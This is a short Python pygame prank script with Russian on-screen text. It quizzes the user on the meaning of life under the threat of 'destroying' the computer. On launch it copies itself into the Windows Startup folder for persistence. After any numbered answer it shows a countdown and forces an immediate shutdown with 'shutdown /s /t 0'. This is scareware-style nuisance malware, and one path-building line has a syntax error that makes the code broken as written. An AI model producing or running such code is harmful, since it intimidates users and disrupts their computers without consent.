import pygame
import sys
import time
import os
import shutil
import getpass

FileName = os.path.basename(sys.argv[0])
USER_NAME = getpass.getuser()
FilePos = os.path.dirname(os.path.abspath(__file__))
shutil.move(FilePos "/" + FileName, 'C:/Users/' + USER_NAME + '\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup')


pygame.font.init()

sc = pygame.display.set_mode()
sc.fill((0, 0, 0))

f1 = pygame.font.Font(None, 72)
f2 = pygame.font.Font(None, 120)
f3 = pygame.font.Font(None, 42)
text1 = f1.render('В ЧЕМ СМЫСЛ ЖИЗНИ???', True, (255, 0, 0))
text2 = f1.render('Не правильный ответ приведет к уничтожению компа!', True, (255, 0, 0))
text3 = f2.render('1. спать', True, (255, 0, 0))
text4 = f2.render('2. комп', True, (255, 0, 0))
text5 = f2.render('3. коты', True, (255, 0, 0))
text6 = f2.render('4. не один из выше перечисленных', True, (255, 0, 0))
text7 = f3.render('(для ответа нажмите на цифру соответственно вашему выбору)', True, (255, 0, 0))
text8 = f1.render('ПРАВИЛЬНО, но комп тоже уничтожу  :)', True, (0, 255, 0))
text10 = f2.render('не правильно! :) ', True, (255, 0, 0))

sc.blit(text1, (30, 20))
sc.blit(text2, (20, 80))
sc.blit(text3, (20, 200))
sc.blit(text4, (20, 300))
sc.blit(text5, (20, 400))
sc.blit(text6, (20, 500))
sc.blit(text7, (20, 800))

pygame.display.update()

while 1:
    for event in pygame.event.get():
        if event.type == pygame.QUIT:
            pygame.quit()  
            sys.exit()

        elif event.type == pygame.KEYDOWN:
            if event.key == pygame.K_4:
                sc.fill((0, 0, 0))
                sc.blit(text8, (100, 400))
                pygame.display.update()

            elif event.key in [pygame.K_1, pygame.K_2, pygame.K_3]:
                sc.fill((0, 0, 0))
                sc.blit(text10, (100, 400))
                pygame.display.update()
            
            

    
            time.sleep(2)
            text11 = f1.render('Уничтожение через: 3', True, (255, 0, 0))
            sc.fill((0, 0, 0))
            sc.blit(text11, (100, 400))
            pygame.display.update()

            time.sleep(2)
            text11 = f1.render('Уничтожение через: 2', True, (255, 0, 0))
            sc.fill((0, 0, 0))
            sc.blit(text11, (100, 400))
            pygame.display.update()

            time.sleep(2)
            text11 = f1.render('Уничтожение через: 1', True, (255, 0, 0))
            sc.fill((0, 0, 0))
            sc.blit(text11, (100, 400))
            pygame.display.update()

            
            os.system("shutdown /s /t 0")

            pygame.quit()  
            sys.exit()
